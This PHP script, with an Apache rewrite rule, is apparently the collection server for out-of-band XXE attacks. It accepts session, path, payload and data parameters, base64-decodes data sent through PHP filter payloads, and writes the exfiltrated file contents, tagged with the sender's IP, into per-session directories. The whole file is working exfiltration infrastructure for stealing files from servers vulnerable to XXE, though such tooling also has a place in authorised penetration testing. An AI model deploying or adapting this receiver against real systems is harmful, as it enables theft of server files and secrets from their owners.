<?php
/* RewriteRule "^xoxo/([a-z0-9]+)/([0-9]+)/([a-f0-9]+)/([0-9]+)/(.*)$" "/xxe_store.php?session_id=$1&path_id=$2&hex_param=$3&payload=$4&data=$5" */

$session_id = isset($_GET["session_id"]) ? $_GET["session_id"] : "";
$path_id = isset($_GET["path_id"]) ? $_GET["path_id"] : "";
$hex_param = isset($_GET["hex_param"]) ? $_GET["hex_param"] : "";
$payload_num = isset($_GET["payload"]) ? $_GET["payload"] : "";
$data = isset($_GET["data"]) ? $_GET["data"] : "";
$ip = $_SERVER["REMOTE_ADDR"];

// Even if URL rewriting protects most of the requests we still have to check parameters format
if (strlen($session_id) != 6) exit();
if (!ctype_alnum($session_id)) exit();
if (!ctype_digit($path_id)) exit();
if (!ctype_xdigit($hex_param)) exit();
if (!ctype_digit($payload_num)) exit();
if (!strlen($data)) exit();

if ($payload_num < 3) {
    // those are PHP payloads using a filter to encode the data in base64
    $data = base64_decode($data);
}


$time = time();
$directory = "./xxe_data/$session_id/$path_id/$hex_param/";
if (!is_dir($directory)) mkdir($directory, 0777, true);
file_put_contents("$directory/$time-$payload_num-$ip.txt", $data, FILE_APPEND);
?>
